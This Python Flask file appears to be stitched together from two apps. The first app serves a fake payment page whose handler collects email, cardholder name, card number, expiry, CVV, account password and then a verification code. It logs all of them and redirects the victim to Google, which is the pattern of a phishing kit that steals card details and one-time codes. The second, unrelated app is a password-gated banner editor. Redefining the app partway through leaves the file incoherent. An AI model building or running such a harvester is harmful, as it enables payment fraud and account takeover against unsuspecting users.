from flask import Flask, render_template, request, redirect
import os
import time
app = Flask(__name__)

@app.route("/test")
def test():
    return "Flask is working"

@app.route("/")
def home():
    return render_template("payment.html")

@app.route("/verifying.html")
def verifying():
    return render_template("verifying.html")

@app.route("/verify.html")
def verify():
    return render_template("verify.html")

@app.route("/process-payment", methods = ["POST"])
def process_payment():
    email = request.form.get("email")
    cardholder = request.form.get("cardholder")
    cardnumber = request.form.get("card_number")
    expiry = request.form.get("expiry")
    pin = request.form.get("cvv")
    password = request.form.get("password")

    print("Email:", email)
    print("Cardholder:", cardholder)
    print("Card Number:", cardnumber)
    print("Expiry: ", expiry)
    print("Pin: ",pin)
    print("Password: ", password)
    print(request.form, flush=True)
    
    

    return redirect("/verifying.html") 


@app.route("/verify-code", methods=["POST"])
def verify_code():
    code = request.form.get("code")
    print("code:", code)
    print(request.form, flush=True)
    # save code...

    return redirect("https://www.google.com")


from flask import Flask, render_template, request, redirect, session
import os

app = Flask(__name__)

app.secret_key = os.environ.get("SECRET_KEY", "change-this")

# Temporary example storage
banner_text = "Welcome to my website"

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")


@app.route("/")
def home():
    return render_template(
        "index.html",
        banner_text=banner_text
    )


@app.route("/admin", methods=["GET", "POST"])
def admin():

    if not session.get("admin"):
        if request.method == "POST":
            if request.form.get("password") == ADMIN_PASSWORD:
                session["admin"] = True
                return redirect("/admin")

        return render_template("admin.html", login=True)

    global banner_text

    if request.method == "POST":
        banner_text = request.form.get("banner_text", "")
        return redirect("/admin")

    return render_template(
        "admin.html",
        login=False,
        banner_text=banner_text
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
    
